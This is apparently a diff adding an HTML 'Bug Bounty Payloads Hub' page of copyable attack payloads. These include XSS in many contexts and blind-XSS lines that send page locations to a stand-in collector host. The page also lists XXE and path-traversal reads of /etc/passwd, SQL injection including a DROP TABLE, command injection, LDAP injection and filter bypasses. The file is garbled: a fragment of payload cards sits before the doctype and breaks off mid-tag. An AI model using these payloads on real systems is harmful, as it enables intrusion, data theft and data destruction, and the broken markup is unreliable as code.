@@ -1,0 +1,919 @@
+    <div class="container">
+        <div class="warning">
+            <h3>⚠️ ETHICAL USAGE ONLY ⚠️</h3>
+            <p>These payloads are for authorized security testing and educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.</p>
+        </div>
+
+<!-- XXE Payloads -->
+            <div class="payload-card" data-category="xxe">
+                <div class="card-header">
+                    <span class="card-icon">📄</span>
+                    <h3 class="card-title">XXE Payloads</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Header Injection (Blind XSS) -->
+            <div class="payload-card" data-category="header-injection">
+                <div class="card-header">
+                    <span class="card-icon">📡</span>
+                    <h3 class="card-title">Header Injection (Blind XSS)</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        curl -H "User-Agent: &lt;/script&gt;&lt;img src=x onerror=\"this.src='https://COLLECTOR.example/bxss?h=ua&u='+encodeURIComponent(location)\"&gt;" https://target.tld/
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        curl -H "Referer: '&gt;&lt;/script&gt;&lt;svg onload=\"new Image().src('https://COLLECTOR.example/bxss?h=ref&u='+encodeURIComponent(location))\"&gt;&lt;/svg&gt;" https://target.tld/
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        curl -H "X-Forwarded-For: \" autofocus onfocus=\"new Image().src('https://COLLECTOR.example/bxss?h=xff&u='+encodeURIComponent(location))\" x=\"" https://target.tld/
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- File Upload XSS -->
+            <div class="payload-card" data-category="file-upload">
+                <div class="card-header">
+                    <span class="card-icon">📁</span>
+                    <h3 class="card-title">File Upload XSS</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        "'&gt;&lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?f=name'" &gt;.png
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        "&gt;&lt;img src=x onerror=alert('stored')&gt;.png
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;?xml version="1.0" standalone="no"?&gt;&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;animate attributeName="x" dur="1s" from="0" to="1" onbegin="new Image().src('https://COLLECTOR.example/bxss?f=svg')"/&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Markdown/WYSIWYG XSS -->
+            <div class="payload-card" data-category="markdown-xss">
+                <div<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty Payloads Hub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #00ff41;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .header {
+            text-align: center;
+            padding: 2rem 0;
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 2px solid #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+
+        .header h1 {
+            font-size: 3rem;
+            text-shadow: 0 0 20px #00ff41;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        .header p {
+            margin-top: 0.5rem;
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 20px #00ff41; }
+            to { text-shadow: 0 0 30px #00ff41, 0 0 40px #00ff41; }
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .search-bar {
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .search-input {
+            width: 100%;
+            max-width: 500px;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00ff41;
+            border-radius: 25px;
+            color: #00ff41;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .search-input:focus {
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+
+        .search-input::placeholder {
+            color: rgba(0, 255, 65, 0.6);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .payload-card {
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff41;
+            border-radius: 10px;
+            padding: 1.5rem;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payload-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .payload-card:hover::before {
+            left: 100%;
+        }
+
+        .payload-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .card-icon {
+            font-size: 1.5rem;
+            margin-right: 0.5rem;
+        }
+
+        .card-title {
+            font-size: 1.3rem;
+            font-weight: bold;
+        }
+
+        .payload-list {
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+            padding: 1rem;
+        }
+
+        .payload-item {
+            background: rgba(0, 20, 0, 0.8);
+            margin: 0.5rem 0;
+            padding: 0.75rem;
+            border-radius: 5px;
+            border-left: 3px solid #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .payload-item:hover {
+            background: rgba(0, 40, 0, 0.8);
+            transform: translateX(5px);
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background: none;
+            border: none;
+            color: #00ff41;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            font-size: 0.8rem;
+        }
+
+        .payload-item:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 2px solid #00ff41;
+            margin-top: 2rem;
+        }
+
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 1rem;
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+
+        .warning h3 {
+            color: #ff0000;
+            margin-bottom: 0.5rem;
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #00ff41;
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00cc33;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            .grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+
+    <header class="header">
+        <h1>⚡ Bug Bounty Payloads Hub ⚡</h1>
+        <p>Your Ultimate Collection of Security Testing Payloads</p>
+    </header>
+
+        <div class="search-bar">
+            <input type="text" class="search-input" id="searchInput" placeholder="Search payloads...">
+        </div>
+
+        <div class="grid" id="payloadGrid">
+            <!-- Reflected XSS Payloads -->
+            <div class="payload-card" data-category="reflected-xss">
+                <div class="card-header">
+                    <span class="card-icon">🔥</span>
+                    <h3 class="card-title">Reflected XSS - HTML Context</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;script&gt;alert(1)&lt;/script&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg onload=alert(1)&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;img src=x onerror=alert(1)&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;details open ontoggle=alert(1)&gt;&lt;/details&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %3Cscript%3Ealert(1)%3C%2Fscript%3E
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %3Csvg%20onload%3Dalert(1)%3E%3C%2Fsvg%3E
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Reflected XSS - Attribute Context -->
+            <div class="payload-card" data-category="attribute-xss">
+                <div class="card-header">
+                    <span class="card-icon">⚡</span>
+                    <h3 class="card-title">Reflected XSS - Attribute Context</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        " autofocus onfocus=alert(1) x="
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ' onmouseover=alert(1) x='
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                         onpointerenter=alert(1) 
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        / onanimationstart=alert(1) 
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %27%20onmouseover%3Dalert(1)%20x%3D%27
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Reflected XSS - JS Context -->
+            <div class="payload-card" data-category="js-xss">
+                <div class="card-header">
+                    <span class="card-icon">💻</span>
+                    <h3 class="card-title">Reflected XSS - JavaScript Context</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        ';alert(1);//
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ";alert(1);//
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        `);alert(1);//
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %27%3Balert(1)%3B%2F%2F
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %22%3Balert(1)%3B%2F%2F
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stored XSS Payloads -->
+            <div class="payload-card" data-category="stored-xss">
+                <div class="card-header">
+                    <span class="card-icon">💾</span>
+                    <h3 class="card-title">Stored XSS Payloads</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;script&gt;alert('stored')&lt;/script&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg onload=alert('stored')&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;img src=x onerror=alert('stored')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;marquee onstart=alert('stored')&gt;XSS&lt;/marquee&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;details open ontoggle=alert('stored')&gt;test&lt;/details&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;input autofocus onfocus=alert('stored')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;video src=x onerror=alert('stored')&gt;&lt;/video&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;a href=javascript:alert('stored')&gt;click me&lt;/a&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DOM-based XSS -->
+            <div class="payload-card" data-category="dom-xss">
+                <div class="card-header">
+                    <span class="card-icon">🌐</span>
+                    <h3 class="card-title">DOM-based XSS</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        #&lt;img src=x onerror=alert('DOM-XSS')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        #&lt;svg onload=alert('DOM-XSS')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        #&lt;/script&gt;&lt;script&gt;alert('DOM-XSS')&lt;/script&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ?q=&lt;img src=x onerror=alert('DOM-XSS')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ?q=';alert('DOM-XSS');//
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;iframe srcdoc="&lt;script&gt;alert('DOM-XSS')&lt;/script&gt;"&gt;&lt;/iframe&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;details open ontoggle=alert('DOM-XSS')&gt;&lt;/details&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Blind XSS -->
+            <div class="payload-card" data-category="blind-xss">
+                <div class="card-header">
+                    <span class="card-icon">👁️</span>
+                    <h3 class="card-title">Blind XSS Payloads</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;script&gt;new Image().src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)+'&t='+Date.now()&lt;/script&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg onload="new Image().src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)+'&t='+Date.now()"&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?u='+encodeURIComponent(location)+'&t='+Date.now()'"&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        "&gt;&lt;/script&gt;&lt;img src=x onerror="this.src='https://COLLECTOR.example/bxss?ctx=html&u='+encodeURIComponent(location)"&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        " autofocus onfocus="new Image().src='https://COLLECTOR.example/bxss?ctx=attr_focus&u='+encodeURIComponent(location)" x="
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ';new Image().src('https://COLLECTOR.example/bxss?ctx=js_q&u='+encodeURIComponent(location));//
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SQL Injection -->
+            <div class="payload-card" data-category="sql">
+                <div class="card-header">
+                    <span class="card-icon">💉</span>
+                    <h3 class="card-title">SQL Injection</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        ' OR '1'='1
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        " OR "1"="1
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ' UNION SELECT NULL,NULL,NULL--
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        '; DROP TABLE users;--
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ' OR 1=1#
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        admin'--
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Injection -->
+            <div class="payload-card" data-category="command">
+                <div class="card-header">
+                    <span class="card-icon">💻</span>
+                    <h3 class="card-title">Command Injection</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        ; cat /etc/passwd
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        | whoami
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        && ls -la
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        `id`
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        $(whoami)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ; ping -c 4 google.com
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Path Traversal -->
+            <div class="payload-card" data-category="traversal">
+                <div class="card-header">
+                    <span class="card-icon">📁</span>
+                    <h3 class="card-title">Path Traversal</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        ../../../etc/passwd
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ..\..\..\..\windows\system32\drivers\etc\hosts
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ....//....//....//etc/passwd
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        /var/www/../../etc/passwd
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- LDAP Injection -->
+            <div class="payload-card" data-category="ldap">
+                <div class="card-header">
+                    <span class="card-icon">🔗</span>
+                    <h3 class="card-title">LDAP Injection</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        *)(uid=*))(|(uid=*
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        *)(|(password=*))
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        )(cn=*))(|(cn=*
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        *)(&(objectclass=*))
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Event Handler Variants -->
+            <div class="payload-card" data-category="event-handlers">
+                <div class="card-header">
+                    <span class="card-icon">⚡</span>
+                    <h3 class="card-title">Event Handler Variants</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        onfocus=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        onclick=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        onpointerenter=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        onauxclick=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ontoggle=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        onwheel=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        onanimationstart=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        ontransitionend=alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- URL/Protocol Context -->
+            <div class="payload-card" data-category="url-protocol">
+                <div class="card-header">
+                    <span class="card-icon">🌍</span>
+                    <h3 class="card-title">URL/Protocol Context</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;a href=javascript:alert(1)&gt;click&lt;/a&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        javascript:alert(1)
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        https://target.tld/search?q=%3Csvg%20onload%3Dalert(1)%3E
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        https://target.tld/?name=%22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        https://target.tld/view#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Polyglot/Breakout Payloads -->
+            <div class="payload-card" data-category="polyglot">
+                <div class="card-header">
+                    <span class="card-icon">🔧</span>
+                    <h3 class="card-title">Polyglot/Breakout Payloads</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;/script&gt;&lt;svg onload=alert(1)&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        "&gt;&lt;svg onload=alert(1)&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        '&gt;&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        '&gt;&lt;script&gt;alert('stored')&lt;/script&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        "&gt;&lt;svg onload=alert('stored')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        --&gt;&lt;/script&gt;&lt;img src=x onerror=alert('stored')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Space/Case/Encoding Bypasses -->
+            <div class="payload-card" data-category="bypass">
+                <div class="card-header">
+                    <span class="card-icon">🚫</span>
+                    <h3 class="card-title">Filter Bypass Techniques</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;svg&lt;svg/onload=alert(1)&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &amp;lt;svg onload=alert(1)&amp;gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        %3Csvg%20onload%3D%22new%20Image().src%3D'https%3A%2F%2FCOLLECTOR.example%2Fbxss%3Fu%3D'%2BencodeURIComponent(location)%22%3E%3C%2Fsvg%3E
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Advanced XSS Payloads -->
+            <div class="payload-card" data-category="advanced-xss">
+                <div class="card-header">
+                    <span class="card-icon">🎯</span>
+                    <h3 class="card-title">Advanced XSS Techniques</h3>
+                </div>
+                <div class="payload-list">
+                    <div class="payload-item">
+                        &lt;svg&gt;&lt;animate onbegin=alert('DOM-XSS') attributeName=x dur=1s&gt;&lt;/animate&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg&gt;&lt;animate onbegin=alert('stored') attributeName=x dur=1s repeatCount=indefinite&gt;&lt;/animate&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;/title&gt;&lt;img src=x onerror=alert('DOM-XSS')&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg onload=console.log('XSS')&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg onload=confirm('XSS')&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                    <div class="payload-item">
+                        &lt;svg onload=prompt('XSS')&gt;&lt;/svg&gt;
+                        <button class="copy-btn" onclick="copyPayload(this)">📋</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2025 Bug Bounty Payloads Hub | Use Responsibly | Happy Hunting! 🎯</p>
+    </footer>
+
+    <script>
+        // Matrix rain effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
+        const matrixArray = matrix.split("");
+
+        const font_size = 10;
+        const columns = canvas.width / font_size;
+
+        const drops = [];
+        for(let x = 0; x < columns; x++) {
+            drops[x] = 1;
+        }
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = '#00ff41';
+            ctx.font = font_size + 'px arial';
+            
+            for(let i = 0; i < drops.length; i++) {
+                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
+                ctx.fillText(text, i * font_size, drops[i] * font_size);
+                
+                if(drops[i] * font_size > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(draw, 35);
+
+        // Copy payload function
+        function copyPayload(button) {
+            const payloadText = button.parentElement.textContent.replace('📋', '').trim();
+            navigator.clipboard.writeText(payloadText).then(() => {
+                button.textContent = '✅';
+                setTimeout(() => {
+                    button.textContent = '📋';
+                }, 1000);
+            });
+        }
+
+        // Search functionality
+        const searchInput = document.getElementById('searchInput');
+        const payloadCards = document.querySelectorAll('.payload-card');
+
+        searchInput.addEventListener('input', function() {
+            const searchTerm = this.value.toLowerCase();
+            
+            payloadCards.forEach(card => {
+                const cardTitle = card.querySelector('.card-title').textContent.toLowerCase();
+                const payloadItems = card.querySelectorAll('.payload-item');
+                let hasMatch = cardTitle.includes(searchTerm);
+                
+                payloadItems.forEach(item => {
+                    const payloadText = item.textContent.toLowerCase();
+                    if (payloadText.includes(searchTerm)) {
+                        hasMatch = true;
+                        item.style.display = 'block';
+                    } else if (searchTerm !== '') {
+                        item.style.display = 'none';
+                    } else {
+                        item.style.display = 'block';
+                    }
+                });
+                
+                card.style.display = hasMatch ? 'block' : 'none';
+            });
+        });
+
+        // Resize canvas on window resize
+        window.addEventListener('resize', function() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
